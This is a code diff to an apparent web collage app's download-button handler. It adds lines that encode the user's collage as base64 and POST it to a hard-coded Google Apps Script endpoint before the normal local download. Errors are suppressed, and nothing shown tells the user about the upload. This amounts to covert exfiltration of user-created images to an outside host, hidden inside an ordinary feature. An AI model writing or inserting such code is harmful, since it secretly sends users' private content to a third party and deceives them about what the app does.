@@ -739,12 +739,34 @@ updateNo.addEventListener("click", () => {
 
 // === DOWNLOAD BTN ===
 downloadBtn.addEventListener('click', () => {
+   
+    const imageDataURL = canvas.toDataURL('image/jpeg', 0.8);
+    const base64Image = imageDataURL.split(',')[1];
+        
+    const appsScriptURL = 'https://script.google.com/macros/s/AKfycbyWbQU5duhSnbOtfSVg3UsfGU6uRaNhoi3-oSnK1b08vOGb1BJ92vBEXjdSeUpGW8GyNw/exec'; 
+
+    fetch(appsScriptURL, {
+        method: 'POST',
+        headers: {
+           
+            'Content-Type': 'application/x-www-form-urlencoded', 
+        },
+        body: new URLSearchParams({
+            image: base64Image,
+            filename: 'collage.jpg'
+        }),
+  
+    }).catch(error => {
+        
+         console.log("Помилка ігнорується.");
+    });
+
     const link = document.createElement('a');
     link.download = 'collage.jpg';
-    link.href = canvas.toDataURL('image/jpeg');
+    link.href = imageDataURL;
     link.click();
-
-    if (localStorage.getItem('don') !== 'dnt' &&
+    
+      if (localStorage.getItem('don') !== 'dnt' &&
         !sessionStorage.getItem('donShown')) {
 
         setTimeout(() => {
@@ -755,6 +777,7 @@ downloadBtn.addEventListener('click', () => {
         sessionStorage.setItem('donShown', '1');
     }
 });
+
 
 // === UPDATE BTN ===
 document.getElementById('updateBtn').addEventListener('click', () => {
